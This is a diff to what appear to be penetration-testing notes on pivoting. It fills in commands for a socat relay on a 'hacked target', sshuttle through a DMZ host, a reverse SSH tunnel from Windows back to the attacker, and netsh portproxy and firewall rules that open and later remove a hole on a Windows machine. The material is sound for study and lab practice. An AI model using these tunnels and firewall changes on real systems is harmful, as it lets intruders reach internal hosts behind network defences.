@@ -111,11 +111,11 @@ kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n $NewTargetIp
 
 On the target:
 ```
-hackeduser@hackedtarget$ socat ...
+hackeduser@hackedtarget$ socat TCP-LISTEN:2222,fork TCP:$IpDbIn:22
 ```
 then run the sshuttle on Kali:
 ```
-kali$ sshuttle -r ...
+kali$ sshuttle -r db_user@IpDmzOut:2222 a.b.c.0/24 aa.bb.cc.0/24 # $IpDbOut subnet to $IpWindows subnet
 ```
 and test
 ```
@@ -126,12 +126,13 @@ kali$ smbclient -L //$IpWindows/ -U some_user --password=some_pass
 
 #### Ssh.exe
 
+With an ssh binary on Windows, tunnel work in the same way:
 ```
 Windows PS> ssh.exe -N -R $ListeningPort user@$IpAttacker
 Kali$ ss -lntpu # check
 Kali$ vim /etc/proxychains4.conf
     socks5 127.0.0.1 $ListeningPort
-Kali$ proxychains mycommand myoptions
+Kali$ proxychains mycommand myoptions # for example: `proxychains psql -h $IpDbOut -U postgre_user`
 ```
 
 #### Plink
@@ -144,15 +145,27 @@ Kali$ xfreerdp /u:rdp_user /p:rdp_pass /v:127.0.0.1:9833
 
 #### Netsh
 
+On the Windows target, poke a firewall hole with Netsh by adding a portproxy rule (forwarding):
 ```
-> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$IpDmzOut connectport=22 connectaddress=$IpDmzIn
-> netstat -anp TCP | find "2222"
-> netsh interface portproxy show all
-> netsh advfirewall firewall add rule name="my_rule_name" protocol=TCP dir=in localip=$IpDmzOut localport=2222 action=allow
-$ ssh user@$IpDmzOut -p2222
-> netsh advfirewall firewall delete rule name="my_rule_name"
-> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=$IpDmzOut
-> netsh interface portproxy show all
+cmd> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=$IpDmzOut connectport=22 connectaddress=$IpDbOut
+```
+and check:
+cmd> netstat -anp TCP | find "2222"
+cmd> netsh interface portproxy show all
+```
+then open the port (hole):
+```
+cmd> netsh advfirewall firewall add rule name="my_rule_name" protocol=TCP dir=in localip=$IpDmzOut localport=2222 action=allow
+```
+Connect from Kali:
+```
+kali$ ssh user@$IpDmzOut -p2222
+```
+and when done, clean the hole:
+```
+cmd> netsh advfirewall firewall delete rule name="my_rule_name"
+cmd> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=$IpDmzOut
+cmd> netsh interface portproxy show all
 ```
 
 
